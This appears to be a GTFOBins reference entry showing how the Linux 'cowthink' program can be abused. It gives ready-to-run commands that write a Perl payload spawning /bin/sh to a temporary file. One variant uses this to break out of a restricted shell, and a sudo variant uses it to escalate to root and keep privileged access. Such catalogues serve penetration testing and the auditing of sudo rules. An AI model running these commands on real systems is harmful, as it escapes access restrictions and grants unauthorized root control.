# GTFOBin: cowthink

It allows to execute `perl` code, other functions may apply.

## Shell

It can be used to break out from restricted environments by spawning an interactive system shell.

```
TF=$(mktemp)
echo 'exec "/bin/sh";' >$TF
cowthink -f $TF x
```

## Sudo

If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.

```
TF=$(mktemp)
echo 'exec "/bin/sh";' >$TF
sudo cowthink -f $TF x
```